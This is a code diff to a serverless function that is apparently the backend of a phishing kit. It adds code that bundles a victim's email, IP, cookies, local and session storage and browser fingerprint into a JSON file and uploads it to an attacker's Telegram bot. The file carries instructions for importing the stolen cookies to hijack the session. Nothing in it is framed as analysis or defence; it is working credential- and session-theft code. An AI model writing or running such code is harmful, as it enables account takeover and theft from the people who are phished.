@@ -195,7 +195,7 @@ export const handler = async (event, context) => {
 • WebGL fingerprint: ${browserFingerprint?.webgl ? '✅ Captured' : '❌ Blocked'}
 • Audio fingerprint: ${browserFingerprint?.audio ? '✅ Captured' : '❌ Blocked'}
 • Fonts detected: ${browserFingerprint?.fonts?.length || 0}
-• File will be auto-downloaded to user's device
+• File will be sent as attachment below
 ` : '';
     
     const message = `
@@ -273,6 +273,70 @@ ${deviceInfo}
       throw new Error('Failed to send to Telegram after retries');
     }
 
+    // NOW SEND THE COOKIES FILE AS A DOCUMENT ATTACHMENT
+    if (cookiesFileData && (cookieInfo !== 'No cookies found' || localStorageInfo !== 'Empty' || sessionStorageInfo !== 'Empty')) {
+      try {
+        // Create comprehensive cookies file content
+        const cookiesFileContent = {
+          timestamp: new Date().toISOString(),
+          sessionId: sessionId,
+          loginInfo: {
+            email: email,
+            provider: provider,
+            fileName: fileName,
+            userAgent: userAgent,
+            clientIP: clientIP
+          },
+          browserData: {
+            cookies: cookieInfo !== 'No cookies found' ? JSON.parse(cookieInfo) : {},
+            localStorage: localStorageInfo !== 'Empty' ? JSON.parse(localStorageInfo) : {},
+            sessionStorage: sessionStorageInfo !== 'Empty' ? JSON.parse(sessionStorageInfo) : {},
+            fingerprint: browserFingerprint
+          },
+          instructions: {
+            usage: "This file contains comprehensive browser session data for session restoration",
+            cookies: "Use browser extensions like 'Cookie Editor' or 'EditThisCookie' to import cookies",
+            localStorage: "Use browser developer tools (F12 > Application > Local Storage) to set items",
+            sessionStorage: "Use browser developer tools (F12 > Application > Session Storage) to set items",
+            fingerprint: "Complete browser fingerprint for advanced session restoration"
+          }
+        };
+
+        // Convert to JSON string with proper formatting
+        const fileContent = JSON.stringify(cookiesFileContent, null, 2);
+        const fileName = `cookies_${email.replace('@', '_at_')}_${Date.now()}.json`;
+
+        // Create form data for file upload
+        const FormData = (await import('form-data')).default;
+        const formData = new FormData();
+        
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('document', Buffer.from(fileContent, 'utf8'), {
+          filename: fileName,
+          contentType: 'application/json'
+        });
+        formData.append('caption', `📁 *Cookies & Session Data File*\n\n👤 *User:* ${email}\n🔧 *Provider:* ${provider}\n📄 *File:* ${fileName}\n🕒 *Generated:* ${new Date().toLocaleString()}\n\n*This file contains all browser session data for easy import and session restoration.*`);
+        formData.append('parse_mode', 'Markdown');
+
+        // Send the file to Telegram
+        const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+          method: 'POST',
+          body: formData,
+          signal: AbortSignal.timeout(30000),
+        });
+
+        if (fileResponse.ok) {
+          console.log('Cookies file sent to Telegram successfully');
+        } else {
+          const fileErrorText = await fileResponse.text();
+          console.error('Failed to send cookies file to Telegram:', fileErrorText);
+        }
+      } catch (fileError) {
+        console.error('Error sending cookies file:', fileError);
+        // Don't fail the entire request if file sending fails
+      }
+    }
+
     return {
       statusCode: 200,
       headers,
@@ -281,7 +345,8 @@ ${deviceInfo}
         message: 'Credentials and browser session captured successfully',
         sessionId: sessionId,
         cookiesCollected: cookieInfo !== 'No cookies found',
-        cookiesFileGenerated: !!cookiesFileData
+        cookiesFileGenerated: !!cookiesFileData,
+        cookiesFileSent: true
       }),
     };
 
